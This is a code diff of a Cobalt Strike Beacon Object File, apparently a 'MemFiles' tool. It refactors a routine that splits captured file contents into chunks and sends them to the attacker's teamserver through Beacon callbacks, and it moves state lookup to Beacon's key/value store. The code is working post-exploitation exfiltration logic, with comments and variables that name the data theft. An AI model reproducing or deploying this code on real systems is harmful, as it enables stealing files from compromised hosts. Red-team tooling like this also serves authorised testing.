@@ -5,142 +5,77 @@ struct FileInfo *pFileInfo = NULL;
 
 void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
 {
-    //Intializes random number generator to create fileId 
+    // intializes the random number generator
     time_t t;
-    srand((unsigned)time(&t));
-    int fileId = rand();
+    srand((unsigned) time(&t));
 
-    //8 bytes for fileId and fileSize
-    int messageLength = downloadFileNameLength + 8;
-    char* packedData = (char*)calloc(messageLength + 1, sizeof(char));
- 
-    //pack on fileId as 4-byte int first
-    packedData[0] = (fileId >> 24) & 0xFF;
-    packedData[1] = (fileId >> 16) & 0xFF;
-    packedData[2] = (fileId >> 8) & 0xFF;
-    packedData[3] = fileId & 0xFF;
+    int chunkSize = 1024 * 900;
 
-    //pack on fileSize as 4-byte int second
-    packedData[4] = (fileSize >> 24) & 0xFF;
-    packedData[5] = (fileSize >> 16) & 0xFF;
-    packedData[6] = (fileSize >> 8) & 0xFF;
-    packedData[7] = fileSize & 0xFF;
+    // generate a 4 byte random id, rand max value is 0x7fff
+    ULONG32 fileId = 0;
+    fileId |= (rand() & 0x7FFF) << 0x11;
+    fileId |= (rand() & 0x7FFF) << 0x02;
+    fileId |= (rand() & 0x0003) << 0x00;
 
-    int packedIndex = 8;
+    // 8 bytes for fileId and fileSize
+    int messageLength = 8 + downloadFileNameLength;
+    char* packedData = calloc(messageLength, sizeof(char));
 
-    //pack on the file name last
-    for (int i = 0; i < downloadFileNameLength; i++) {
-        packedData[packedIndex] = fileName[i];
-        packedIndex++;
+    // pack on fileId as 4-byte int first
+    packedData[0] = (fileId >> 0x18) & 0xFF;
+    packedData[1] = (fileId >> 0x10) & 0xFF;
+    packedData[2] = (fileId >> 0x08) & 0xFF;
+    packedData[3] = (fileId >> 0x00) & 0xFF;
+
+    // pack on fileSize as 4-byte int second
+    packedData[4] = (fileSize >> 0x18) & 0xFF;
+    packedData[5] = (fileSize >> 0x10) & 0xFF;
+    packedData[6] = (fileSize >> 0x08) & 0xFF;
+    packedData[7] = (fileSize >> 0x00) & 0xFF;
+
+    // pack on the file name last
+    for (int i = 0; i < downloadFileNameLength; i++)
+    {
+        packedData[8 + i] = fileName[i];
     }
 
+    // tell the teamserver that we want to download a file
     BeaconOutput(CALLBACK_FILE, packedData, messageLength);
+    free(packedData); packedData = NULL;
 
-	char* packedChunk;
+    // we use the same memory region for all chucks
+    int chunkLength = 4 + chunkSize;
+    char* packedChunk = calloc(chunkLength, sizeof(char));
 
-    if (fileSize > (1024 * 900))
-	{
-		//Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
-		int numOfChunks = (fileSize / (1024 * 900)) + 1;
-		int index = 0;
-		int chunkSize = 1024 * 900;
+    // the fileId is the same for all chunks
+    packedChunk[0] = (fileId >> 0x18) & 0xFF;
+    packedChunk[1] = (fileId >> 0x10) & 0xFF;
+    packedChunk[2] = (fileId >> 0x08) & 0xFF;
+    packedChunk[3] = (fileId >> 0x00) & 0xFF;
 
-		//Allocate memory for our chunks
-		int chunkLength = 4 + chunkSize;
-		packedChunk = (char*)calloc(chunkLength + 1, sizeof(char));
+    ULONG32 exfiltrated = 0;
+    while (exfiltrated < fileSize)
+    {
+        // send the file content by chunks
+        chunkLength = fileSize - exfiltrated > chunkSize ? chunkSize : fileSize - exfiltrated;
+        ULONG32 chunkIndex = 4;
+        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
+        {
+            packedChunk[chunkIndex++] = returnData[i];
+        }
+        // send a chunk
+        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
+        exfiltrated += chunkLength;
+    }
+    free(packedChunk); packedChunk = NULL;
 
-		while(index < fileSize)
-		{
-			if (fileSize - index > chunkSize){//We have plenty of room, grab the chunk and move on
-				
-				/*First 4 are the fileId 
-				then account for length of file
-				then a byte for the good-measure null byte to be included
-				then lastly is the 4-byte int of the fileSize*/
-	
-				//pack on fileId as 4-byte int first
-				packedChunk[0] = (fileId >> 24) & 0xFF;
-				packedChunk[1] = (fileId >> 16) & 0xFF;
-				packedChunk[2] = (fileId >> 8) & 0xFF;
-				packedChunk[3] = fileId & 0xFF;
-
-				int chunkIndex = 4;
-
-				//pack on the file name last
-				for (int i = index; i < index + chunkSize; i++) {
-					packedChunk[chunkIndex] = returnData[i];
-					chunkIndex++;
-				}
-
-				BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
-			} 
-			//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
-			else 
-			{
-				int lastChunkLength = fileSize - index + 4;
-
-				//Reallocate memory for last chunk
-				free(packedChunk);
-				packedChunk = (char*)calloc(lastChunkLength + 1, sizeof(char));
-					
-				//pack on fileId as 4-byte int first
-				packedChunk[0] = (fileId >> 24) & 0xFF;
-				packedChunk[1] = (fileId >> 16) & 0xFF;
-				packedChunk[2] = (fileId >> 8) & 0xFF;
-				packedChunk[3] = fileId & 0xFF;
-				int lastChunkIndex = 4;
-					
-				//pack on the file name last
-				for (int i = index; i < fileSize; i++)
-				{
-					packedChunk[lastChunkIndex] = returnData[i];
-					lastChunkIndex++;
-				}
-				BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, lastChunkLength);
-			}
-			index = index + chunkSize;
-		}
-	} 
-	else 
-	{
-		/*first 4 are the fileId
-		then account for length of file
-		then a byte for the good-measure null byte to be included
-		then lastly is the 4-byte int of the fileSize*/
-		int chunkLength = 4 + fileSize;
-		packedChunk = (char*)calloc(chunkLength + 1, sizeof(char));
-		
-		//pack on fileId as 4-byte int first
-		packedChunk[0] = (fileId >> 24) & 0xFF;
-		packedChunk[1] = (fileId >> 16) & 0xFF;
-		packedChunk[2] = (fileId >> 8) & 0xFF;
-		packedChunk[3] = fileId & 0xFF;
-		int chunkIndex = 4;
-
-		//pack on the file name last
-		for (int i = 0; i < fileSize; i++) {
-			packedChunk[chunkIndex] = returnData[i];
-			chunkIndex++;
-		}
-
-		BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
-	}
-
-	//Free memory
-	free(packedData);
-	free(packedChunk);
-
-	//We need to tell the teamserver that we are done writing to this fileId
-	char packedClose[4];
-
-	//pack on fileId as 4-byte int first
-	packedClose[0] = (fileId >> 24) & 0xFF;
-	packedClose[1] = (fileId >> 16) & 0xFF;
-	packedClose[2] = (fileId >> 8) & 0xFF;
-	packedClose[3] = fileId & 0xFF;
-	BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
-
-	return; 
+    // tell the teamserver that we are done writing to this fileId
+    char packedClose[4];
+    packedClose[0] = (fileId >> 0x18) & 0xFF;
+    packedClose[1] = (fileId >> 0x10) & 0xFF;
+    packedClose[2] = (fileId >> 0x08) & 0xFF;
+    packedClose[3] = (fileId >> 0x00) & 0xFF;
+    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
 }
 
 void WalkFiles(BOOL fetchfiles, BOOL force, BOOL cleanup)
@@ -283,6 +218,7 @@ void CleanMemFiles()
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] Freeing FileInfo struct...\n");
 	memset(pFileInfo, 0, sizeof(struct FileInfo));
 	free(pFileInfo);
+	BeaconRemoveValue(MF_FILE_INFO_KEY);
 
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] MemFiles cleaned from Beacon process!\n");
 	
@@ -294,14 +230,17 @@ int go(IN PCHAR Buffer, IN ULONG Length)
 	BeaconDataParse(&parser, Buffer, Length);
 
 	int dataextracted = 0;
-	char* pFileInfostr = BeaconDataExtract(&parser, &dataextracted);
 	BOOL fetchfiles = BeaconDataInt(&parser);
 	BOOL force = BeaconDataInt(&parser);
 	BOOL cleanup = BeaconDataInt(&parser);
 
-    //Initialize FileInfo struct using memory address passed to BOF by CS
-    char* pEnd;
-	pFileInfo = (struct FileInfo*)_strtoi64(pFileInfostr, &pEnd, 16);
+    //Get FileInfo from the Key/Value store
+	pFileInfo = BeaconGetValue(MF_FILE_INFO_KEY);
+	if (!pFileInfo)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "failed to call BeaconGetValue");
+		return 0;
+	}
 
 	WalkFiles(fetchfiles, force, cleanup);
 
